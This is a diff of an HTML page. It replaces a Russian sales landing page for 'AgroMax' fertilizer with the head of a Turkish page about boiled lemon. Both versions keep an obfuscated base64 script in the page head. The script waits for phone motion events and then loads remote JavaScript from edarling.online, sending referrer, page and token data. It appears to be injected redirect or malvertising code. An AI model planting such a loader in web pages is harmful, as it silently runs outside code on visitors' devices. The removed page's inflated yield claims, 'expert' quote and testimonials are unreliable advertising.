@@ -1,764 +1,103 @@
-<!doctype html>
-<html lang="ru">
-
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <script src="data:text/javascript;base64,KGZ1bmN0aW9uKCkgew0KdmFyIG5hbWUgPSAnX1NUMlpiY2Jrd2ZKanBSZjgnOw0KaWYgKCF3aW5kb3cuX1NUMlpiY2Jrd2ZKanBSZjgpIHsNCndpbmRvdy5fU1QyWmJjYmt3ZkpqcFJmOCA9IHsNCnVuaXF1ZTogZmFsc2UsDQp0dGw6IDg2NDAwLA0KUl9QQVRIOiAnaHR0cHM6Ly9lZGFybGluZy5vbmxpbmUvUTgxazFQJywNClBfUEFUSDogJ2h0dHBzOi8vZWRhcmxpbmcub25saW5lLzIwMTQ2ODkvcG9zdGJhY2snLA0KfTsNCn0NCmNvbnN0IF9oelFrTjdCcVRRUVRaM0NzID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOw0KaWYgKHR5cGVvZiBfaHpRa043QnFUUVFUWjNDcyAhPT0gJ3VuZGVmaW5lZCcgJiYgX2h6UWtON0JxVFFRVFozQ3MgIT09IG51bGwpIHsNCnZhciBfdkhIYkxnUGZWcXFzNzRSZiA9IEpTT04ucGFyc2UoX2h6UWtON0JxVFFRVFozQ3MpOw0KdmFyIF9xZkNrajlrdGhXbnYxQ21rID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsNCmlmIChfdkhIYkxnUGZWcXFzNzRSZi5jcmVhdGVkX2F0ICsgd2luZG93Ll9TVDJaYmNia3dmSmpwUmY4LnR0bCA8IF9xZkNrajlrdGhXbnYxQ21rKSB7DQpsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsNCmxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOw0KbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOw0KfQ0KfQ0KdmFyIF9QNXlnd3BHYmRCamM3SEJMID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7DQp2YXIgX1d4THY4bXpraEozQzVCOEIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsNCnZhciBfTXBXSlltTW5HUWo2MWNRSCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7DQpfTXBXSlltTW5HUWo2MWNRSCArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsNCl9NcFdKWW1NbkdRajYxY1FIICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CQkNCnZhciBub2RlQUcgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGRkJyk7DQp2YXIgbWF4QUcgPSAwOw0KZnVuY3Rpb24gb25Nb3Rpb25DaGFuZ2UoZSkgew0KdmFyIGFnID0gZS5hY2NlbGVyYXRpb25JbmNsdWRpbmdHcmF2aXR5Ow0KZm9yKHZhciBpIGluIGFnKXsNCmlmKE1hdGguYWJzKG1heEFHKSA8IE1hdGguYWJzKGFnW2ldKSl7DQptYXhBRyA9IGFnW2ldOw0KfQ0KfQ0KX01wV0pZbU1uR1FqNjFjUUggKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArbWF4QUcudG9GaXhlZCgyKTsJDQpfTXBXSlltTW5HUWo2MWNRSCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7DQpfTXBXSlltTW5HUWo2MWNRSCArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsNCl9NcFdKWW1NbkdRajYxY1FIICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fU1QyWmJjYmt3ZkpqcFJmOC5SX1BBVEgpOw0KaWYgKHR5cGVvZiBfUDV5Z3dwR2JkQmpjN0hCTCAhPT0gJ3VuZGVmaW5lZCcgJiYgX1A1eWd3cEdiZEJqYzdIQkwgJiYgd2luZG93Ll9TVDJaYmNia3dmSmpwUmY4LnVuaXF1ZSkgew0KX01wV0pZbU1uR1FqNjFjUUggKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfUDV5Z3dwR2JkQmpjN0hCTCk7DQp9DQppZiAodHlwZW9mIF9XeEx2OG16a2hKM0M1QjhCICE9PSAndW5kZWZpbmVkJyAmJiBfV3hMdjhtemtoSjNDNUI4QiAmJiB3aW5kb3cuX1NUMlpiY2Jrd2ZKanBSZjgudW5pcXVlKSB7DQpfTXBXSlltTW5HUWo2MWNRSCArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX1d4THY4bXpraEozQzVCOEIpOw0KfQ0KdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsNCmEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsNCmEuc3JjID0gd2luZG93Ll9TVDJaYmNia3dmSmpwUmY4LlJfUEFUSCArIF9NcFdKWW1NbkdRajYxY1FIOw0KdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07DQpzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpDQp3aW5kb3cucmVtb3ZlRXZlbnRMaXN0ZW5lcignZGV2aWNlbW90aW9uJywgb25Nb3Rpb25DaGFuZ2UsIHRydWUpOw0KfQ0Kd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2RldmljZW1vdGlvbicsIG9uTW90aW9uQ2hhbmdlLCB0cnVlKTsNCn0pKCk7"></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>AgroMax</title>
-    <link href="https://fonts.ksn.pw/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
-    <link href="https://fonts.ksn.pw/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
-    <link rel="stylesheet" href="build/css/slick.css">
-    <link rel="stylesheet" href="build/css/slick-theme.css">
-    <link rel="stylesheet" href="build/css/timeTo.css">
-    <link rel="stylesheet" href="build/css/font.css">
-    <link rel="stylesheet" href="build/css/style.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/assets/owl.theme.default.min.css">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.1.6/assets/owl.carousel.min.css" rel="stylesheet" />
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>Haşlanmış Limon Nasıl Yapılır? &#8211; Organik Günler | Haşlanmış limon</title>
+<meta name="keywords" content="Haşlanmış Limon Nasıl Yapılır? &#8211; Organik Günler" />
+<meta name="description" content="Haşlanmış Limon Nasıl Yapılır? &#8211; Organik Günler" />
+<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
+
+
 </head>
-
-<body>
-    <script src="counter.js"></script>
-    <header>
-        <div class="header__body">
-            <ul>
-                <li>
-                    Обильное цветение и плодоношение
-                </li>
-                <li>
-                    На 2-3 недели ускоряет созревание
-                </li>
-                <li>
-                    Восхитительный вкус выращенных плодов
-                </li>
-                <li>
-                    Высокий стандарт качества продукции
-                </li>
-            </ul>
-        </div>
-    </header>
-    <div class="main">
-        <div class="info">
-            <div class="info__body">
-                <div class="info__title">
-                    <h2>AgroMax<sup>®</sup>
-                    </h2>
-                    <h3>Органическое удобрение
-                        <span>для усиления роста садовых культур</span>
-                    </h3>
-                    <p>На 50% больше урожая каждый месяц</p>
-                </div>
-                <div class="info__list">
-                    <div class="info__list-pack">
-                        <div class="info__list-pack__new mob">
-                            <p>Специальная цена
-                                <span>
-									<span class="new_price_val">149</span><span class="new_price_cur">руб</span>
-                                </span>
-                            </p>
-                        </div>
-                        <img src="build/images/info-pack.png" alt="" />
-                    </div>
-                    <div class="info__list-body">
-                        <ul>
-                            <li>
-                                1 упаковка = 50 килограммам конского навоза для удобрения
-                            </li>
-                            <li>
-                                100% органическое удобрение, насыщенное питательными веществами
-                            </li>
-                            <li>
-                                Всход любых семян в 2 раза быстрее
-                            </li>
-                            <li>
-                                Стимулирует рост саженцев и черенков
-                            </li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="info__action">
-                    <div class="info__action-note">
-                        <p>*при заказе набора</p>
-                    </div>
-                    <div class="info__action-top">
-                        <div class="info__action-title">
-                            <p>Успейте оформить заказ
-                                <span>ПО АКЦИИ!</span>
-                            </p>
-                        </div>
-                        <div class="info__action-price dec">
-                            <div class="info__action-price__new">
-                                <p>Специальная цена
-                                    <span>
-										<span class="new_price_val">149</span><span class="new_price_cur">руб</span>
-                                    </span>
-                                </p>
-                            </div>
-                        </div>
-                        <div class="info__action-timer">
-                            <p>ДО КОНЦА
-                                <span>АКЦИИ</span> ОСТАЛОСЬ</p>
-                            <div id="countdown-1"></div>
-                        </div>
-                        <div class="info__action-price mob">
-                            <div class="info__action-price__new">
-                                <p>Специальная цена
-                                    <span>
-										<span class="new_price_val">149</span>
-                                    <span class="new_price_cur">руб</span>
-                                    </span>
-                                </p>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="info__action-form">
-                        <form class="landing__form">
-                            <select name="country"></select>
-                            <input type="text" name="name" placeholder="Ваше имя">
-                            <input type="tel" name="phone" placeholder="Номер телефона">
-                            <button type="submit">Заказать AgroMax</button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="problem">
-            <div class="problem__body">
-                <div class="problem__title">
-                    <h2>Садоводы со всей России ежегодно сталкиваются с проблемами!</h2>
-                </div>
-                <div class="problem__text">
-                    <p>Более 70% семян не всходит, 60% рассады погибает в первые 3 недели после высадки</p>
-                    <p>Почему покупая самые дорогие, отборные семена, приходится сталкиваться с
-                        <span>низким количеством всходов?</span> Рассада не набирает жизненных сил, а выжившие растения не плодоносят или дают с каждым годом всё меньше урожая? Как правило, низкая урожайность имеет ряд причин:</p>
-                </div>
-                <div class="problem__list">
-                    <ul>
-                        <li>
-                            Слабые всходы семян
-                        </li>
-                        <li>
-                            Листва растений не набирает сочности и объема
-                        </li>
-                        <li>
-                            Низкая урожайность
-                        </li>
-                        <li>
-                            Рассада развивается медленно
-                        </li>
-                        <li>
-                            Обычные удобрения не работают, либо приводят растения к гибели
-                        </li>
-                        <li>
-                            Мелкие безвкусные плоды
-                        </li>
-                        <li>
-                            Слабая корневая система не доставляет растению питательные вещества
-                        </li>
-                        <li>
-                            Почва теряет питательные свойства
-                        </li>
-                        <li>
-                            Экзотические растения не приживаются в новой почве
-                        </li>
-                        <li>
-                            Растения гибнут от паразитов и вредителей
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-        <div class="universe">
-            <div class="universe__body">
-                <div class="universe__title">
-                    <h2>AgroMax® - универсальное удобрение для всех видов растений</h2>
-                    <p>Активатор роста помогает растениям достигнуть максимальных размеров в короткие сроки. Усиленное питание корневой системы позволяет получить сочные, крупные плоды, обладающие удивительно приятными, сильными вкусовыми качествами.</p>
-                </div>
-                <div class="universe__list">
-                    <ul>
-                        <li>
-                            <img src="build/images/universe-img1.png" alt="" />
-                            <p>Усиление всхода семян</p>
-                        </li>
-                        <li>
-                            <img src="build/images/universe-img2.png" alt="" />
-                            <p>Насыщение корней растений азотом, фосфором, кальцием, магнием.</p>
-                        </li>
-                        <li>
-                            <img src="build/images/universe-img3.png" alt="" />
-                            <p>Активизация процессов метаболизма молодых растений </p>
-                        </li>
-                        <li>
-                            <img src="build/images/universe-img4.png" alt="" />
-                            <p>Повышение урожайности на 50%. В два раза больше спелых плодов в один период плодоношения.</p>
-                        </li>
-                        <li>
-                            <img src="build/images/universe-img5.png" alt="" />
-                            <p>Натуральные сочные овощи, выращенные на натуральном удобрении свосхитительным, ярким вкусом.</p>
-                        </li>
-                    </ul>
-                </div>
-                <div class="universe__btn">
-                    <button data-toggle="scroll" data-id="#form">Заказать AgroMax</button>
-                </div>
-            </div>
-        </div>
-        <div class="consist">
-            <div class="consist__body">
-                <div class="consist__title">
-                    <h2>От проращивания семян до получения урожая - меньше 5ти месяцев</h2>
-                    <p>Секрет активатора роста растений заложен в уникальной формуле. AgroMax - высококонцентрированный препарат, имеющий в составе более 40 ключевых микроэлементов. </p>
-                </div>
-                <div class="consist__pack">
-                    <img src="build/images/consist-pack.png" alt="" />
-                    <p>удобная форма для удобрения земли</p>
-                </div>
-                <div class="consist__list">
-                    <ul>
-                        <li>
-                            <h4>Биогумус</h4>
-                            <img src="build/images/consist-img1.png" alt="" />
-                            <p>Концентрированный конский навоз насыщает землю большим количеством углекислого газа, усиливает скорость поступления питательных веществ в листья и плоды растения.</p>
-                        </li>
-                        <li>
-                            <h4>АЗОТОБАКТЕРИИ</h4>
-                            <img src="build/images/consist-img2.png" alt="" />
-                            <p>Восстанавливают и структурируют плодородную почву. Способствуют активному размножению полезных бактерий и улучшению их симбиоза с растениями.</p>
-                        </li>
-                        <li>
-                            <h4>Фосфор</h4>
-                            <img src="build/images/consist-img3.png" alt="" />
-                            <p>Главный источник энергии для роста растений. Ускоряет всход, укоренение, цветение и плодоношение всех растений.</p>
-                        </li>
-                        <li>
-                            <h4>Кальций</h4>
-                            <img src="build/images/consist-img4.png" alt="" />
-                            <p>Часть обязательного питания для растений, формирует здоровый иммунитет растения</p>
-                        </li>
-                        <li>
-                            <h4>Магний</h4>
-                            <img src="build/images/consist-img5.png" alt="" />
-                            <p>Помогает усваивать максимум питательных веществ из почвы, воды, солнечного света.</p>
-                        </li>
-                        <li>
-                            <h4>Азот</h4>
-                            <img src="build/images/consist-img6.png" alt="" />
-                            <p>Делает стенки растения твердыми, листву сочной, цветы и плоды крупными и насыщенными вкусом.</p>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-        <div class="expert">
-            <div class="carousel">
-                <div class="owl-carousel slide-one">
-                    <div class="item-1" data-hash="slide1">
-                        <div class="expert__body">
-                            <div class="expert__title">
-                                <div class="expert__title-name">
-                                    <h2>AgroMax</h2>
-                                </div>
-                                <div class="expert__title-text">
-                                    <h2>Мнение эксперта:
-                                        <span>Огород будет приносить вам радость круглый год!</span>
-                                    </h2>
-                                </div>
-                            </div>
-                            <div class="video">
-                                <center>
-
-<iframe
-src="https://www.youtube.com/embed/aqblfhKxljc"
-srcdoc="<style>*{padding:0;margin:0;overflow:hidden}html,body{height:100%}img,span{position:absolute;width:100%;top:0;bottom:0;margin:auto}span{height:1.5em;text-align:center;font:48px/1.5 sans-serif;color:white;text-shadow:0 0 0.5em black}</style><a href=https://www.youtube.com/embed/aqblfhKxljc?autoplay=1><img src=https://img.youtube.com/vi/aqblfhKxljc/hqdefault.jpg><span>▶</span></a>"
-frameborder="0"
-allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
-allowfullscreen></iframe>									
-                                </center>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="item-2" data-hash="slide2">
-                        <div class="expert__body">
-                            <div class="expert__title">
-                                <div class="expert__title-name">
-                                    <h2>AgroMax</h2>
-                                </div>
-                                <div class="expert__title-text">
-                                    <h2>Мнение эксперта:
-                                        <span>Огород будет приносить вам радость круглый год!</span>
-                                    </h2>
-                                </div>
-                            </div>
-                            <div class="expert__info">
-                                <div class="expert__img mob">
-                                    <img src="build/images/expert-img.jpg" alt="" />
-                                </div>
-                                <div class="expert__text">
-                                    <p>За 6 лет тестирования активатора роста AgroMax мы получили более 40 000 отзывов от профессиональных садоводов и дачников-любителей со всей России. Концентрат представляет из себя по-настоящему инновационный продукт,
-                                        сочетающий в себе все известные разработки в области агрономии и сельского хозяйства. Спектр действия концентрата огромен, он ускоряет всход семян, рост зеленой части растения, цветение и плодоношение. Мы добились
-                                        того, что средняя продолжительность плодоношения растения в тепличных условиях - 4-5 месяцев! Почти полгода непрерывного сбора крупных, сочных, вкусных плодов без нитратов и концерагенов. Это настоящий прорыв в
-                                        </p>
-                                    <p>Александра Григорьева, Аграном, Член Союза Агрономов РФ.</p>
-                                    <img src="build/images/expert-sign.png" alt="" />
-                                </div>
-                                <div class="expert__img dec">
-                                    <img src="build/images/expert-img.jpg" alt="" />
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                </div>
-                <div id="demos-link1" style="margin-top: 20px">
-                    <div class="slide_button">
-                        <a class="slide_button1" href="#slide1">Смотреть видео отзыв</a>
-                    </div>
-                    <div class="slide_button">
-                        <a class="slide_button2" href="#slide2">Читать отзыв</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="expert expert-mob">
-            <div class="expert__body">
-                <div class="expert__title">
-                    <div class="expert__title-name">
-                        <h2>AgroMax</h2>
-                    </div>
-                    <div class="expert__title-text">
-                        <h2>Мнение эксперта:
-                            <span>Огород будет приносить вам радость круглый год!</span>
-                        </h2>
-                    </div>
-                    <div class="expert__info">
-                        <div class="expert__img mob">
-                            <img src="build/images/expert-img.jpg" alt="" />
-                        </div>
-                        <div class="expert__text">
-                            <p>За 6 лет тестирования активатора роста AgroMax мы получили более 40 000 отзывов от профессиональных садоводов и дачников-любителей со всей России. Концентрат представляет из себя по-настоящему инновационный продукт, сочетающий
-                                в себе все известные разработки в области агрономии и сельского хозяйства. Спектр действия концентрата огромен, он ускоряет всход семян, рост зеленой части растения, цветение и плодоношение. Мы добились того, что средняя
-                                продолжительность плодоношения растения в тепличных условиях - 4-5 месяцев! Почти полгода непрерывного сбора крупных, сочных, вкусных плодов без нитратов и концерагенов. Это настоящий прорыв в </p>
-                            <p>Александра Григорьева, Аграном, Член Союза Агрономов РФ.</p>
-                            <img src="build/images/expert-sign.png" alt="" />
-                        </div>
-                        <div class="expert__img dec">
-                            <img src="build/images/expert-img.jpg" alt="" />
-                        </div>
-                    </div>
-                </div>
-                <div class="video">
-                    <center>
-<iframe
-src="https://www.youtube.com/embed/aqblfhKxljc"
-srcdoc="<style>*{padding:0;margin:0;overflow:hidden}html,body{height:100%}img,span{position:absolute;width:100%;top:0;bottom:0;margin:auto}span{height:1.5em;text-align:center;font:48px/1.5 sans-serif;color:white;text-shadow:0 0 0.5em black}</style><a href=https://www.youtube.com/embed/aqblfhKxljc?autoplay=1><img src=https://img.youtube.com/vi/aqblfhKxljc/hqdefault.jpg><span>▶</span></a>"
-frameborder="0"
-allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
-allowfullscreen></iframe>						
-                    </center>
-                </div>
-            </div>
-        </div>
-
-
-        <div class="max">
-            <div class="max__body">
-                <div class="max__title">
-                    <h2>Максимальное увеличение урожайности с AgroMax
-                        <sup>®</sup>
-                    </h2>
-                    <p>Испытания активатора роста AgroMax и сравнение препарата с конкурентами дал ученым более полную картину действия. В результате исследований выяснилось:</p>
-                </div>
-                <div class="max__list">
-                    <ul>
-                        <li>
-                            <img src="build/images/max-img1.png" alt="" />
-                            <p>усиливает рост овощных, садовых и злаковых культур</p>
-                        </li>
-                        <li>
-                            <img src="build/images/max-img2.png" alt="" />
-                            <p>всход любых семян, в том числе экзотических плодоносящих растений.</p>
-                        </li>
-                        <li>
-                            <img src="build/images/max-img3.png" alt="" />
-                            <p>концентрирование всех известных удобрений на рынке.</p>
-                        </li>
-                        <li>
-                            <img src="build/images/max-img4.png" alt="" />
-                            <p>больше питательных веществ поступают по стволу растения в листья и плоды.</p>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-        <div class="attention">
-            <div class="attention__body">
-                <div class="attention__info">
-                    <div class="attention__info-img">
-                        <img src="build/images/attention-apple.png" alt="" />
-                    </div>
-                    <div class="attention__info-text">
-                        <h2>
-                            <span>Внимание!</span> Недобросовестные производители добавляют химию в удобрения!</h2>
-                        <p>Вы замечали, что под видом "натуральных", многие производители продают удобрения с вредными, химическим образом синтезированными веществами?
-                        </p>
-                    </div>
-                </div>
-                <div class="attention__list">
-                    <ul>
-                        <li>
-                            <img src="build/images/attention-img1.jpg" alt="" />
-                            <h4>Ядохимикаты</h4>
-                            <p>Отлично убивают вредителей и сорняки, но неизбежно проникают в зелень и плоды. Попадая в пищу, приводят к пищевым отравлениям и инфекциям.</p>
-                        </li>
-                        <li>
-                            <img src="build/images/attention-img2.jpg" alt="" />
-                            <h4>Инсектициды</h4>
-                            <p>Уничтожают большинство нассекомых, но запрещены в удобрениях на всей территории РФ. Приводят к болезни и смерти скота, домашних животных.</p>
-                        </li>
-                        <li>
-                            <img src="build/images/attention-img3.jpg" alt="" />
-                            <h4>Пестициды</h4>
-                            <p>Избавляют от сорняков злаковые и овощные культуры. При вдыхании человеком ведет к болезням дыхательных путей, легких и сердца.</p>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-            <div class="attention__note">
-                <div class="attention__note-body">
-                    <div class="attention__note-text">
-                        <p>Напоминаем, что жидкий концентрат "AgroMax" является полностью органическим препаратом и не содержит компонентов химической промышленности.
-                        </p>
-                    </div>
-                    <div class="attention__note-btn">
-                        <button data-toggle="scroll" data-id="#form">Заказать AgroMax</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="use">
-            <div class="use__body">
-                <div class="use__top">
-                    <div class="use__pack">
-                        <img src="build/images/use-pack.png" alt="" />
-                    </div>
-                    <div class="use__title">
-                        <h2>Как использовать AgroMax
-                            <sup>®</sup> в саду, на участке и в теплице? </h2>
-                        <p>Концентрат AgroMax
-                            <sup>®</sup> идеально подходит для удобрения растений в любых условиях и в любое время года. Для достижения великолепного результата необходимо следовать правилам:</p>
-                    </div>
-                </div>
-                <div class="use__steps">
-                    <ul>
-                        <li>
-                            <div class="use__steps-num">
-                                <p>1</p>
-                            </div>
-                            <div class="use__steps-img">
-                                <img src="build/images/use-img1.jpg" alt="" />
-                            </div>
-                            <div class="use__steps-text">
-                                <p>Содержимое саше смешайте с водой из расчета 1 саше на 10-20 л воды. Дайте раствору настояться на 5-10 минут.</p>
-                            </div>
-                        </li>
-                        <li>
-                            <div class="use__steps-num">
-                                <p>2</p>
-                            </div>
-                            <div class="use__steps-img">
-                                <img src="build/images/use-img2.jpg" alt="" />
-                            </div>
-                            <div class="use__steps-text">
-                                <p>Для полива можно использовать пластиковые или железные лейки и ведра. Полив осуществляется обильно вокруг растений.</p>
-                            </div>
-                        </li>
-                        <li>
-                            <div class="use__steps-num">
-                                <p>3</p>
-                            </div>
-                            <div class="use__steps-img">
-                                <img src="build/images/use-img3.jpg" alt="" />
-                            </div>
-                            <div class="use__steps-text">
-                                <p>С помощью опрыскивателя распылите раствор на листву и цветки для опыления, усиления цветения и плодоношения.</p>
-                            </div>
-                        </li>
-                    </ul>
-                </div>
-                <div class="use__list">
-                    <ul>
-                        <li>
-                            Полностью безопасен в использовании
-                        </li>
-                        <li>
-                            Безвреден для детей и домашних животных
-                        </li>
-                        <li>
-                            Замедляет рост сорняков
-                        </li>
-                        <li>
-                            Отпугивает вредителей
-                        </li>
-                    </ul>
-                </div>
-                <div class="use__feed">
-                    <div class="use__feed-title">
-                        <h4>Мнения садоводов об активаторе роста AgroMax
-                            <sup>®</sup>
-                        </h4>
-                    </div>
-                    <div class="owl-carousel slide-one use__feed-slider">
-                        <div class="item-1">
-                            <div class="review_item">
-                                <center>
-<iframe
-src="https://www.youtube.com/embed/HBQM4cj6ZkU"
-srcdoc="<style>*{padding:0;margin:0;overflow:hidden}html,body{height:100%}img,span{position:absolute;width:100%;top:0;bottom:0;margin:auto}span{height:1.5em;text-align:center;font:48px/1.5 sans-serif;color:white;text-shadow:0 0 0.5em black}</style><a href=https://www.youtube.com/embed/HBQM4cj6ZkU?autoplay=1><img src=https://img.youtube.com/vi/HBQM4cj6ZkU/hqdefault.jpg><span>▶</span></a>"
-frameborder="0"
-allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
-allowfullscreen></iframe>									
-                                </center>
-
-                            </div>
-                        </div>
-                        <div class="item-2">
-                            <div class="review_item">
-                                <center>
-<iframe
-src="https://www.youtube.com/embed/YA1bdQ-YKFg"
-srcdoc="<style>*{padding:0;margin:0;overflow:hidden}html,body{height:100%}img,span{position:absolute;width:100%;top:0;bottom:0;margin:auto}span{height:1.5em;text-align:center;font:48px/1.5 sans-serif;color:white;text-shadow:0 0 0.5em black}</style><a href=https://www.youtube.com/embed/YA1bdQ-YKFg?autoplay=1><img src=https://img.youtube.com/vi/YA1bdQ-YKFg/hqdefault.jpg><span>▶</span></a>"
-frameborder="0"
-allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
-allowfullscreen></iframe>									
-                                </center>
-                            </div>
-                        </div>
-                        <div class="item-3">
-                            <div class="review_item">
-                                <center>
-<iframe
-src="https://www.youtube.com/embed/OyRQYPfWarA"
-srcdoc="<style>*{padding:0;margin:0;overflow:hidden}html,body{height:100%}img,span{position:absolute;width:100%;top:0;bottom:0;margin:auto}span{height:1.5em;text-align:center;font:48px/1.5 sans-serif;color:white;text-shadow:0 0 0.5em black}</style><a href=https://www.youtube.com/embed/OyRQYPfWarA?autoplay=1><img src=https://img.youtube.com/vi/OyRQYPfWarA/hqdefault.jpg><span>▶</span></a>"
-frameborder="0"
-allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
-allowfullscreen></iframe>									
-                                </center>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- <div class="use__feed-slider">
-						<section class="regular slider slider1">
-
-							<div class="video">
-								<iframe src="https://youtube.com/embed/OyRQYPfWarA"></iframe>
-							</div class="video">
-							<div class="video">
-								<iframe src="https://youtube.com/embed/HBQM4cj6ZkU"></iframe>
-							</div>
-							<div class="video">
-								<iframe src="https://youtube.com/embed/YA1bdQ-YKFg"></iframe>
-							</div>
-						</section>
-					</div> -->
-                    <div class="use__feed-slider">
-                        <section class="regular slider">
-                            <div>
-                                <div class="use__feed-img">
-                                    <img src="build/images/feed-img1.jpg" alt="" />
-                                </div>
-                                <div class="use__feed-text">
-                                    <h4>"Такой урожай бывает только у тех, кто заботится о своём огороде и выбирает правильные удобрения!"</h4>
-                                    <p>В прошлом году в области лето прошло холодным и дождливым, у соседей все саженцы перебило, никакого урожая не родилось к осени, даже яблок! А нашему саду хоть бы что, удобрили по весне АгроМакс и всё лето у нас шли:
-                                        кабачки, баклажаны, помидоры, огурцы тепличные, ягод уродилось много. Цветник полила - цвели обычные садовые гартенции, астры, пионы, хризантемы почти до ноября. В будущем году решила пойти на рисковый шаг - высадить
-                                        кустовые розы! Всю жизнь о них мечтала, да в нашем климате они мало у кого растут хорошо... А растут они у тех, кто использует правильные подкормки! Раньше не задумывалась об этом, жалко, сколько урожая упущено,
-                                        сколько солений, варенья, кампотов! Всю зиму теперь собираем огурчики в тепличке, уже взошли семена на будущий год - перцы и помидоры. Для всего использую Агро Макс, во всем он меня выручает!</p>
-                                </div>
-                            </div>
-                            <div>
-                                <div class="use__feed-img">
-                                    <img src="build/images/feed-img2.jpg" alt="" />
-                                </div>
-                                <div class="use__feed-text">
-                                    <h4>"Соседи приходят смотреть какого размера у нас в огороде выросли помидоры!"</h4>
-                                    <p>Неожиданно и приятно было получить такой потрясающий урожай! Удобрять землю AgroMax начиная с апреля, высаживали перцы, баклажаны, кабачки, корнишоны, тыкву, огурцы, помидоры, капусту, морковь, патиссоны, брокколи.
-                                        Обработали почву сада под сливами, вишнями, гуршами и всеми ягодами. Такого урожая у нас еще никогда не было! Очень скуцсные овощи, продегустировали и оценили уже в начале июля! Помидоры сорта бычьи сердца - великолепные,
-                                        насыщенные, вкусные и самое главное - большие! Таких больших помидор ни у кого из сосдей нет, приходят в гости смотреть своими глазами, не верят! Всё в моем саду натуральное, всё выращено своими руками без химии,
-                                        это очень радует!</p>
-                                </div>
-                            </div>
-                            <div>
-                                <div class="use__feed-img">
-                                    <img src="build/images/feed-img3.jpg" alt="" />
-                                </div>
-                                <div class="use__feed-text">
-                                    <h4>"Действительно вкусные, не пластиковые плоды"</h4>
-                                    <p>Здравствуйте! У меня не очень большой опыт садоводства, но я уже делаю необычайные успехи! Всего 3 года назад появилась дача, а у муня уже вырастают необычайного размера огурцы, перцы, помидоры. клубника! Земля на участке
-                                        изначально было не очень подходящей для выращивания, на ней трава даже плохо росла. Немного поменяли землю в самых сухих участках, остальное регулярно удобряли АгроМакс концентратом для активации роста растений.
-                                        Результаты великолепные! Растет всё в 2 раза быстрее, цветет обильно, плодов много и они действительно вкусные, не пластиковые! Удобрение органическое, нет смысла даже бояться с ним переборщить, всё пойдет только
-                                        на пользу!</p>
-                                </div>
-                            </div>
-                        </section>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="order">
-            <div class="order__body">
-                <div class="order__title">
-                    <h2>Как сделать заказ на AgroMax® и получить активатор роста уже завтра?</h2>
-                </div>
-                <div class="order__list">
-                    <ul>
-                        <li>
-                            <img src="build/images/order-img1.png" alt="" />
-                            <h4>ЗАЯВКА</h4>
-                            <p>Заполняете простую форму на сайте</p>
-                        </li>
-                        <li>
-                            <img src="build/images/order-img2.png" alt="" />
-                            <h4>КОНСУЛЬТАЦИЯ</h4>
-                            <p>Наш менеджер проконсультирует вас и оформит заказ</p>
-                        </li>
-                        <li>
